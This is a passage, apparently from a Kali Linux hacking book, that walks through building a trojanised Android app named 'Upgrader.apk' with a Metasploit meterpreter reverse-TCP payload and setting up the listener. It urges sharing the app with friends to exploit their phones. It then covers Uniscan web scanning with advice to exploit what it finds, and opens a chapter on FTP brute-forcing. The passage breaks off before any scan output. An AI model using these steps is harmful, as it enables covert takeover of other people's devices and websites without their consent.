    Begin by firing up Kali Linux. Launch the terminal and then create some Trojan
    .apk. To do this, type the command given below:


    msfpayload android/meterpreter/reverse_tcp LHOST=192.168.0.4 R > /root/Upgrader.apk


    Note that the LHOST in the above command should be replaced by your own IP address.
    It is also possible for you to hack Android on WAN that is, via interest by use
    of the IP address which is in the LHOST and then doing port forwarding.


    Go ahead and launch another terminal, and then wait for the file to be produced.
    You can then go ahead and open the metasploit console by typing the following
    command:


    Msfconsole


    ![](images/00007.jpeg)


    It is now time for you to setup the listener. The loading might take some time,
    but once it is complete, just load your multhandler by use of the following command:


    use exploit/multi/handler


    The payload can then be setup by use of the following command:


    set payload android/meterpreter/reverse_tcp


    To set the type of L host, just run the following command:


    set LHOST 192.168.0.4


    For those who are hacking on the WAN, just type the internal or the private IP
    but not the external or the public IP.


    Lastly, it will be time for you to do the exploitation by typing the following
    command:


    Exploit


    The above command is expected to startup the listener. You can copy the app which
    you have just made, which is Upgrader.apk from your root folder to the Android
    phone. You can share this with your friends the way you need, and you will have
    a chance to exploit their Android phones.


    Allow the users to install the app on their Android phones, with the option for
    installing the apps from Unknown Sources being enabled. Once the app is opened,
    the meterpreter prompt will appear.


    Using Uniscan


    This is a simple Local File Include, Remote File Include, and a vulnerability
    scanner for Remote Command Execution. This tool is simple, but it does a nice
    job for web scanning in Kali Linux. A strong Internet connection will be needed
    for you to scan your website with this tool.


    When using this tool, you have the option of using either the command line tool
    or the graphical user interface. To use it, you can combine the “uniscan” command
    with the options given below:


        -h     help


        -u     <url> example: https://www.site.com/


        -f     <file> list of url''s


        -b     Uniscan go to the background


        -q     Enable the Directory checks


        -w     Enable the File checks


        -e     Enable the robots.txt and the sitemap.xml check


        -d     Enable the Dynamic checks


        -s     Enable the Static checks


        -r     Enable the Stress checks


        -i     <dork> the Bing search


        -o     <dork> the Google search


        -g     Web fingerprint


        -j     Server fingerprint


    To scan a website URL, we use the –u option, and the directory and dynamic checks
    are enabled by use of the –qd options. The following command demonstrates this:


    uniscan -u http://sitename.com/ -qd


    The command will then list all the possible vulnerabilities in the website for
    the specified URL.


    That is how you can scan for a website via the command line. Also, it is possible
    for you to scan a website via the graphical user interface (GUI). First, begin
    by running the following command on the terminal:


    uniscan-gui


    This will start the GUI so that you can begin to scan the website you need. In
    the case of the GUI, you have to type in the URL of the site which you are targeting,
    and then you will have the option of choosing the type of checks which you need
    to perform on that site. Once you are done, just click on “Start Scan” and the
    website scan will be started.


    You may need to check everything as the scan continues. If this is the case, you
    should type the uniscan command from the command line together with the –b option.
    The –b option has the effect of running the command in the background. Consider
    the example given below:


    uniscan -u test-a.blackmoreops.com –bqdw


    Once you have known the vulnerabilities for a particular site, you just have to
    go ahead and exploit them, and you will get what you want from the site.


    # Chapter 7- Hacking FTP Server in Kali Linux


    In most of the servers, an open ftp is vulnerable to attacks. One can carry out
    a brute force attack by using the username and password. In this chapter, we will
    use brute force on a ftp server which has an open ftp port.


    You should use Msfconsole, but this comes pre-installed in Kali Linux. You should
    have two word lists. If you have only one, just go ahead and create a second one.
    Just create two wordlists, each with usernames and passwords, and you will be
    set to go.


    You can open the terminal of your Kali Linux machine and then start the postgresql
    database by running the following command:


    service postgresql start


     Next, start the metasploit by running the following command:


    Msfconsole


    The first thing which we should find is the IP address of the target and the open
    ftp port. This is why we will begin by running an nmap scan so that we can identify
    these. You don’t have to launch another termina,l as the nmap commands can still
    be executed within the Msfconsole console. Run the command given below:


    nmap -F sitename.com


    This should give you an output which resembles the one given below:


